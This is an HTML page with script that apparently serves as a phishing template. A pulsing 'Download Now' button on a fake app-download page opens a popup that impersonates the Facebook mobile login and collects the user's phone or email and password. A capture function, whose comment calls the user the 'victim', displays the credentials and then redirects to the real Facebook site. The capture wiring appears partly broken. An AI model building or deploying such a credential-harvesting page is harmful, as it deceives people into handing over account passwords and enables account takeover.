<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>App Download</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #1c1e21; /* Dark background for contrast */
            font-family: Helvetica, Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }

        /* Main Container - Mobile Size Look */
        .phone-frame {
            width: 100%;
            max-width: 400px; /* Phone width limit */
            height: 100%;
            max-height: 850px;
            background: white;
            position: relative;
            display: flex;
            flex-direction: column;
            box-shadow: 0 0 20px rgba(0,0,0,0.5);
        }

        /* Image Area - 9:16 Ratio */
        .image-area {
            width: 100%;
            height: 75%; /* Zyadatar area image ke liye */
            overflow: hidden;
            position: relative;
        }

        .hero-image {
            width: 100%;
            height: 100%;
            object-fit: cover; /* Image stretch nahi hogi, crop hogi */
        }

        /* Highlight Button */
        .download-btn-container {
            height: 25%;
            display: flex;
            justify-content: center;
            align-items: center;
            background: linear-gradient(to top, rgba(0,0,0,0.8), transparent);
            padding-bottom: 20px;
        }

        .download-btn {
            background-color: #1877f2;
            color: white;
            border: none;
            padding: 15px 40px;
            font-size: 20px;
            font-weight: bold;
            border-radius: 50px;
            cursor: pointer;
            box-shadow: 0 0 15px #1877f2; /* Glow effect */
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
            50% { transform: scale(1.05); box-shadow: 0 0 25px #1877f2; }
            100% { transform: scale(1); box-shadow: 0 0 15px #1877f2; }
        }

    </style>
</head>
<body>

    <!-- Main Landing Page -->
    <div class="phone-frame">
        <div class="image-area">
            <!-- Yahan apni high quality mobile wallpaper link daalo -->
            <img src="https://images.unsplash.com/photo-1611162617474-5b21e879e113?q=80&w=1000&auto=format&fit=crop" 
                 alt="App Preview" 
                 class="hero-image">
        </div>
        
        <div class="download-btn-container">
            <button class="download-btn" onclick="openLoginWindow()">Download Now</button>
        </div>
    </div>

    <script>
        function openLoginWindow() {
            // Fake Window Open Karein
            const win = window.open("", "_blank", "width=350,height=650");
            
            win.document.write(`
                <html>
                <head>
                    <title>Facebook</title>
                    <meta name="viewport" content="width=device-width, initial-scale=1.0">
                    <style>
                        body { 
                            font-family: Helvetica, Arial, sans-serif; 
                            background: #fff; 
                            margin: 0; 
                            padding: 0;
                            display: flex;
                            justify-content: center;
                        }
                        .fb-mobile-container {
                            width: 100%;
                            max-width: 350px;
                            padding: 20px;
                            box-sizing: border-box;
                            background: #fff;
                        }
                        .logo { 
                            text-align: center; 
                            font-size: 36px; 
                            color: #1877f2; 
                            font-weight: bold; 
                            margin-bottom: 40px; 
                            letter-spacing: -1px;
                        }
                        input {
                            width: 100%;
                            padding: 16px;
                            margin-bottom: 12px;
                            border: 1px solid #dddfe2;
                            border-radius: 8px;
                            font-size: 16px;
                            box-sizing: border-box;
                            outline: none;
                        }
                        input:focus {
                            border-color: #1877f2;
                            box-shadow: 0 0 0 2px #e7f3ff;
                        }
                        button {
                            width: 100%;
                            padding: 14px;
                            background: #1877f2;
                            color: white;
                            font-size: 18px;
                            font-weight: bold;
                            border: none;
                            border-radius: 8px;
                            cursor: pointer;
                            margin-top: 10px;
                        }
                        button:hover { background: #166fe5; }
                        .links {
                            text-align: center;
                            margin-top: 20px;
                            font-size: 14px;
                        }
                        a { color: #1877f2; text-decoration: none; }
                    </style>
                </head>
                <body>
                    <div class="fb-mobile-container">
                        <div class="logo">facebook</div>
                        
                        <form id="loginForm" onsubmit="captureData(event)">
                            <!-- Sirf Number/Email -->
                            <input type="text" id="email" placeholder="Phone number or email address" required autocomplete="off">
                            
                            <!-- Sirf Password -->
                            <input type="password" id="pass" placeholder="Password" required autocomplete="off">
                            
                            <button type="submit">Log In</button>
                        </form>
                        
                        <div class="links">
                            <a href="#">Forgot password?</a>
                            <br><br>
                            <span style="color:#606060;">Don't have an account? </span>
                            <a href="#">Sign up</a>
                        </div>
                    </div>
                </body>
                </html>
            `);

            // Data Capture Function
            window.captureData = function(e) {
                e.preventDefault();
                
                const email = document.getElementById('email').value;
                const pass = document.getElementById('pass').value;

                // Victim ko data dikhana (Alert me)
                alert("Details Captured:\n\nNumber/Email: " + email + "\nPassword: " + pass);

                // Real Facebook par redirect karna
                win.location.href = "https://www.facebook.com";
            };
        }
    </script>

</body>
</html>
